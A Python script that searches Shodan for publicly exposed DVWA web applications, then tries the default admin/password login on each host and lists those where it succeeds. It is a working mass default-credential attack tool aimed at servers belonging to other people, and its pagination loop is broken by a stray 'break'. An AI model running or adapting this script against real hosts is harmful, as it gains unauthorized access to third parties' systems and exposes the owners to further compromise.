#!/usr/bin/env python3


import shodan
import time
import requests
import re



# YOUR API KEY: 



SHODAN_API_KEY = '<YOUR_SHODAN_API_KEY_HERE>'
api = shodan.Shodan(SHODAN_API_KEY)


def request_page_from_shodan(query, page=1):
    while True:
        try:
            instances = api.search(query, page=page)
            return instances
        except shodan.APIError as e:
            print(f"Error: {e}")
            time.sleep(7)


def has_valid_credentials(instance):
    sess = requests.Session()
    proto = ('ssl' in instance) and 'https' or 'http'
    try:
        res = sess.get(f"{proto}://{instance['ip_str']}:{instance['port']}/login.php", verify=False)
    except requests.exceptions.ConnectionError:
        return False
    if res.status_code != 200:
        print(f"[-] Got HTTP status code {res.status_code}, expected 200")
        return False
    token = re.search(r"user_token' value='([0-9a-f]+)'", res.text).group(1)
    res = sess.post(
        f"{proto}://{instance['ip_str']}:{instance['port']}/login.php",
        f"username=admin&password=password&user_token={token}&Login=Login",
        allow_redirects=False,
        verify=False,
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )
    if res.status_code == 302 and res.headers['Location'] == 'index.php':

        return True
    else:
        return False

def process_page(page):
    result = []
    for instance in page['matches']:
        if has_valid_credentials(instance):
            print(f"[+] valid credentials at : {instance['ip_str']}:{instance['port']}")
            result.append(instance)
    return result

def query_shodan(query):
    print("[*] querying the first page")
    first_page = request_page_from_shodan(query)
    total = first_page['total']
    already_processed = len(first_page['matches'])
    result = process_page(first_page)
    page = 2
    while already_processed < total:
        break
        print("querying page {page}")
        page = request_page_from_shodan(query, page=page)
        already_processed += len(page['matches'])
        result += process_page(page)
        page += 1
    return result

# search for DVWA instances
res = query_shodan('title:dvwa')
print(res)
